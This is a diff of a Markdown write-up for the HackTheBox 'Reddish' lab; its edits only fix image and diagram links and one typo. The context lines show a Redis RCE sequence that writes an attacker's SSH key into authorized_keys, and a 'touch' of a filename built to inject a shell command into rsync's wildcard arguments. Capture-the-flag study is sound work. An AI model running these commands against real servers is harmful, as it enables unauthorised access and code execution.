@@ -323,7 +323,7 @@ Using nmap -sC and -sV to identify for the screenshot:
 ![](redisrce.png)
 I am sure I have done this Redis RCE on THM, but I want to read to hammer the RESEARCH button in my brain. Also to count issue in problem solving and desktop space, the beginning on noted diagrams, less ascii art. Introducing [Excalidraw for Obsidian](https://github.com/zsviczian/obsidian-excalidraw-plugin). 
 
-![](Reddish-InitialThinking.md)
+![](Reddish-InitialThinking.excalidraw)
 
 
 ![](bamsearchsploit.png)
@@ -399,7 +399,7 @@ $ redis-cli -h 192.168.1.11 flushall$ cat foo.txt | redis-cli -h 192.168.1.11 -x
 $ redis-cli -h 192.168.1.11
 192.168.1.11:6379> config set dir /Users/antirez/.ssh/
 OK
-192.168.1.11:6379> config get di
+192.168.1.11:6379> config get dir
 1) "dir"
 2) "/Users/antirez/.ssh"
 3) 192.168.1.11:6379> config set dbfilename "authorized_keys"
@@ -637,7 +637,7 @@ touch /var/www/html/f187a0ec71ce99642e4f0afbd441a68b/-e\ sh\ p.rdb
 I decided to follow up to this point and bit further with Ippsec to get this done to move on to finishing my Beyond Roots today! From [Pre 40:00 to 58:00](https://www.youtube.com/watch?v=Yp4oxoQIBAM&t=2342s)
 ![](hurrayevenfurtherbeyond.png)
 
-![1080](Reddish-ImprovedThinking)
+![1080](Reddish-ImprovedThinking.excalidraw.md)
 
 File transfers for Post-Rsync
 ```bash
@@ -853,7 +853,7 @@ The box is actually externally facing! so no chisel is actually required - went 
 ![](rootroot.png)
 
 Finally a map of Reddish
-![1080](Reddish-ImprovedThinking)
+![1080](Reddish-ImprovedThinking.excalidraw.md)
 
 
 ## Beyond Root
